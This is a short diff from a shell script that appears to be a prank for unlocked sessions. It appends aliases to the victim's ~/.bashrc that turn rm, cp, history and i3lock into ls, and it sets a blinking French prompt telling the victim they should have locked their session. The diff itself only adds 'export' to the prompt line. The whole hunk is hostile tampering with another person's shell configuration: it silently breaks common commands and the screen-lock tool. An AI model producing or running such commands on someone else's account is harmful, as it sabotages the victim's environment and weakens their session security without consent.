@@ -16,5 +16,5 @@ echo "alias rm='/bin/ls'" >> ~/.bashrc
 echo "alias cp='/bin/ls'" >> ~/.bashrc
 echo "alias history='/bin/ls'" >> ~/.bashrc
 echo "alias i3lock='/bin/ls'" >> ~/.bashrc
-echo "PS1='\[\e[1;5m\]fallait verouiller sa session aussi \[\e[0m\]'" >> ~/.bashrc
+echo "export PS1='\[\e[1;5m\]fallait verouiller sa session aussi \[\e[0m\]'" >> ~/.bashrc
 source ~/.bashrc
